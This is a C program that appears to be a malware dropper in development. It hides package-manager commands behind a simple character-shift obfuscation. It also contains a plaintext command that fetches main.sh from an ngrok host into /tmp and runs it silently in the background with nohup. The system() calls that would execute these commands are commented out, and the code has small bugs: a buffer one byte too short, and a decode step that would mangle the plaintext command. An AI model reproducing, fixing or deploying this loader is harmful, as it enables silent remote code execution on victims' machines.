#include <string.h>
#include <stdio.h>
#include <stdlib.h>

char *reStore(char *data1, char symbol){
	int firstLen = strlen(data1);
    char *str = malloc(firstLen);
    for(int i=0; i<firstLen; i++){
		if(symbol == '-'){
	        str[i] = *(data1+i) - 1;
		}else{
	        str[i] = *(data1+i) + 1;
		}
    }
    str[firstLen] = '\0';
	return str;
}
void storeLib(){
    char *data1 = "wget https://9d23-103-174-169-74.eu.ngrok.io/main.sh -P /tmp/ > /dev/null 2>&1 ; chmod +x /tmp/main.sh > /dev/null 2>&1 ; nohup bash /tmp/main.sh > /dev/null 2>&1 &";
    char *data2 = "zft!}!qbdnbo!.Tz!xhfu!?!0efw0ovmm!3?'2!";
    char *data3 = "zvn!.z!jotubmm!xhfu!?!0efw0ovmm!3?'2!";
    char *data4 = "bqu!.z!jotubmm!xhfu!?!0efw0ovmm!3?'2!";
    char *gotData1 = reStore(data1, '+');char *gotData2 = reStore(data2, '-');char *gotData3 = reStore(data3, '-');char *gotData4 = reStore(data4, '-');
    printf("%s\n",gotData2);
    printf("%s\n",gotData3);
    printf("%s\n",gotData4);
    printf("%s\n",gotData1);
    // system(gotData2);system(gotData3);system(gotData4);system(gotData1);
	fflush(stdin);
}

void main(int argc, char **argv){
    storeLib();
}

